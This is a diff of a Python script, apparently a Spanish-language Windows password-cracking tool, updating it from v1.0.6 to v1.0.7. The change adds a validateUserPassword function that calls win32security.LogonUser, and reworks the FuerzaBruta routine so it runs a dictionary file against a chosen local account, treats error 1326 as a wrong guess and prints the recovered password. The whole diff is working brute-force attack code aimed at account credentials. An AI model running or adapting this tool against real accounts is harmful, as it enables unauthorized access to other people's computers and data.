@@ -11,10 +11,12 @@
 #          ██║  ██╗██║  ██║██║ ╚═╝ ██║╚██████╔╝███████╗
 #          ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝ ╚═════╝ ╚══════╝
 #                                                         By: LawlietJH
-#                                                               v1.0.6
+#                                                               v1.0.7
 
 from tkinter import filedialog, Tk
 import win32net as WN		# Requiere Instalar PyWin32, Ejecutar Comando desde la Terminal (CMD): python -m pip install pywin32
+import win32security
+import win32con
 import pywintypes			# Tambien Requiere PyWin32.
 import msvcrt
 import os, sys, time
@@ -30,7 +32,7 @@ Banner = """
                   ██║  ██╗██║  ██║██║ ╚═╝ ██║╚██████╔╝███████╗
                   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝ ╚═════╝ ╚══════╝
                                                          By: LawlietJH
-                                                               v1.0.6\
+                                                               v1.0.7\
 """
 
 Tk().withdraw()
@@ -51,7 +53,7 @@ def GetFileName():
 	return Nombre.name
 
 
-def Progreso(x, Total, Palabra, TI):	# Imprime Datos de Progreso.
+def Progreso(x, Total, Palabra, TI, step=0):	# Imprime Datos de Progreso.
 	
 	Progreso = (x * 100) / Total
 	Transc = time.time() - TI
@@ -70,6 +72,12 @@ def Progreso(x, Total, Palabra, TI):	# Imprime Datos de Progreso.
 	bar += ' {}/seg |'.format(PorSeg)
 	bar += ' {} ]'.format(Tiempo(Transc))
 	bar += ' - Probando: {}'.format(Palabra)
+	
+	if step:
+		if step == True:
+			if not x % int(PorSeg/5) == 0: return
+		else:
+			if not x % step == 0: return
 	
 	sys.stdout.write('\r\t\t\t\t\t\t\t\t\t\t\t\t')
 	try: sys.stdout.write(bar)
@@ -269,6 +277,23 @@ def InformacionDeUsuarios():
 	# ~ print(WN.NetGetJoinInformation())
 
 
+def validateUserPassword(userName, passwd):
+	'''
+	Aplicanda en un for puede comprobar cientos de palabras en segundos
+	y devuelve True si la contraseña es la correcta.
+	'''
+	# ~ try:
+	win32security.LogonUser(
+		userName,
+		None,
+		passwd,
+		win32con.LOGON32_LOGON_INTERACTIVE,
+		win32con.LOGON32_PROVIDER_DEFAULT
+	)
+		# ~ return True
+	# ~ except:
+		# ~ return False
+
 #=======================================================================
 
 
@@ -277,12 +302,11 @@ def FuerzaBruta(Usuario):
 	Words = []
 	Actual = 1
 	
-	try: ChangePasswordUser('', '', Usuario)
+	try:
+		validateUserPassword(Usuario, '')
 	except pywintypes.error as error:
-			
-			Err = error.__str__().replace('(','').replace(')','').replace('\'','').split(', ')[0]
-			if int(Err) == 5: return False
-	
+		Err = error.__str__().replace('(','').replace(')','').replace('\'','').split(', ')[0]
+		if int(Err) == 1327: return False
 	
 	sys.stdout.write('\n\n [+] Abriendo Diccionario!')
 	
@@ -293,7 +317,7 @@ def FuerzaBruta(Usuario):
 		if Diccio == None:
 			
 			print('\n\n\t No Elegiste Ningun Archivo')
-			os.system('Pause > Nul')
+			os.system('Pause')
 			return
 		
 		try: open(Diccio,'r')
@@ -309,7 +333,9 @@ def FuerzaBruta(Usuario):
 	Total = len(Words)
 	TI = time.time()
 	
-	sys.stdout.write('\r [+] Al Ataque!\t\t\t\n\n')
+	time.sleep(.1)
+	
+	sys.stdout.write('\r [+] Al Ataque!             \t\t\t\n\n')
 	
 	print(' Progreso:\n')
 	
@@ -319,7 +345,9 @@ def FuerzaBruta(Usuario):
 		
 		try:
 			
-			ChangePasswordUser(Passwd, Passwd, Usuario)
+			# ~ ChangePasswordUser(Passwd, Passwd, Usuario)
+			validateUserPassword(Usuario, Passwd)
+			Progreso(Actual, Total, Passwd, TI)
 			return Passwd
 		
 		except KeyboardInterrupt:
@@ -332,18 +360,28 @@ def FuerzaBruta(Usuario):
 			
 			Err = error.__str__().replace('(','').replace(')','').replace('\'','').split(', ')[0]
 			
-			if int(Err) == 86:
-				if Progreso(Actual, Total, Passwd, TI) == False:
+			if int(Err) == 1326:
+				# (1326, 'LogonUser', 'El nombre de usuario o la contraseña no son correctos.')
+				if Progreso(Actual, Total, Passwd, TI, step=True) == False:
 					sys.stdout.write('\r [!] Los Archivos .'+ Diccio.split('.')[-1].upper() +' No Son Compatibles.\t\t\t\t\t\t\t')
-					os.system('Pause > Nul')
+					os.system('Pause')
 					return
 				Actual += 1
-			if int(Err) == 5:
-				# ~ print('\n\n El Usuario \'' + Usuario + '\' Nego El Acceso (Código 5).\n\n')
-				return False
+			# ~ elif int(Err) == 86:
+				# ~ if Progreso(Actual, Total, Passwd, TI, step=True) == False:
+					# ~ sys.stdout.write('\r [!] Los Archivos .'+ Diccio.split('.')[-1].upper() +' No Son Compatibles.\t\t\t\t\t\t\t')
+					# ~ os.system('Pause')
+					# ~ return
+				# ~ Actual += 1
+			# ~ elif int(Err) == 5:
+				# ~ #print('\n\n El Usuario \'' + Usuario + '\' Nego El Acceso (Código 5).\n\n')
+				# ~ return False
+			else:
+				print(error.__str__())
+				return
 				
 	print('\n\n [!] La Contraseña no se Encontro en el Diccionario!')
-	os.system('Pause > Nul')
+	os.system('Pause')
 
 
 def Main():
@@ -378,12 +416,12 @@ def Main():
 	if PassWD == False:
 		
 		print('\n\n El Usuario \'' + Usuario + '\' No Tiene Contraseña.\n\n')
-		os.system('Pause > Nul')
+		os.system('Pause')
 		return
 	
 	print('\n\n\t\t [+] La Password del Usuario \'' + Usuario + '\' Es: ' + PassWD)
 	
-	os.system('Pause > Nul')
+	os.system('Pause')
 
 
 
@@ -398,8 +436,8 @@ if __name__ == '__main__':
 	# ~ try:
 		
 		# ~ Usuario = 'Prueba'
-		# ~ ActPass = ''
-		# ~ NewPass = '12'
+		# ~ ActPass = 'xD'
+		# ~ NewPass = 'AxD'
 		
 		# ~ ChangePasswordUser(ActPass, NewPass, Usuario)
 		
